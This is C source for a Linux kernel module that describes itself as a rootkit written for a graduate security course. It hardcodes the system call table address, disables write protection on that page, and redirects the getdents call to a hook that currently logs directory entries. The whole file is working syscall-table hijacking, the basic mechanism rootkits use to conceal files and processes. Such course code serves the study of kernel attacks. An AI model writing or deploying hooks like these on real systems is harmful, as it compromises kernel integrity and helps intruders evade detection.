//allows us to perform certain kernel-level operations, such as printk
#include <linux/kernel.h>
//allows us to create the module
#include <linux/module.h>
//allows us to change memory protection settings for the system call table
#include <linux/highmem.h>
//contains the system call numbers
#include <asm/unistd.h>
#include <linux/version.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/syscalls.h>

struct linux_dirent {
	long           d_ino;
	off_t          d_off;
	unsigned short d_reclen;
	char           d_name[];
};


MODULE_LICENSE("GPL");
MODULE_AUTHOR("1337");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("This is a rootkit module written for a graduate computer security course at Stony Brook University. ");

unsigned long * sys_call_table;

asmlinkage int (*real_getdents) (unsigned int, struct linux_dirent*, unsigned int);

asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
	printk(KERN_INFO "hijacked call.\n");
	
	
	//unsigned long dino,doff;
	//unsigned short dreclen;
	//char name[256];
	char *name;
	name = dirp->d_name;

	int num_reads = real_getdents(fd, dirp, count);

	struct linux_dirent *cdirp;
	int i, j;
	long start_offset = dirp;
	cdirp = dirp;
	printk(KERN_INFO "num reads: %d\n",num_reads);

	for (i = 0; i < num_reads; i+= cdirp->d_reclen){
		cdirp = (struct linux_dirent*)(start_offset + i);
		printk(KERN_INFO "d_ino:%lu, d_reclen:%u, d_off:%lu, d_name: %s \n",
		       cdirp->d_ino, cdirp->d_reclen, cdirp->d_off, cdirp->d_name);
	}
	return num_reads;
}



// make the address writable if it is write-protected.
int make_rw(unsigned long address){
	unsigned int level;
      	pte_t *pte = lookup_address(address, &level);
	if(pte->pte &~ _PAGE_RW)
	pte->pte |= _PAGE_RW;
	return 0;
}

int make_ro(unsigned long address){
      unsigned int level;
      pte_t *pte = lookup_address(address, &level);
      pte->pte = pte->pte &~ _PAGE_RW;
      return 0;
}



void hijack_sys_call_table(void){
	make_rw((unsigned long)sys_call_table);
        real_getdents = (void*)*(sys_call_table + __NR_getdents);
        *(sys_call_table + __NR_getdents) = (unsigned long)hijacked_getdents;
	//make_ro((unsigned long)sys_call_table);
}

int init_module(void){
	
	/*
	pointer to the system call table. The address is currently hardcoded,
	taken from the /boot/System map file. This address seems to be the same
	after every boot, so for now it can be hardcoded.
	*/
	sys_call_table = (unsigned long*)0xc1697140;	
	hijack_sys_call_table();	
	
	printk(KERN_INFO "Rootkit added.\n\n");
	
	return 0;
}

void cleanup_module(void){
      	//make_rw((unsigned long)sys_call_table);
	*(sys_call_table + __NR_getdents) = (unsigned long)real_getdents;
	make_ro((unsigned long)sys_call_table);
	printk(KERN_INFO "Rootkit removed.\n");
}
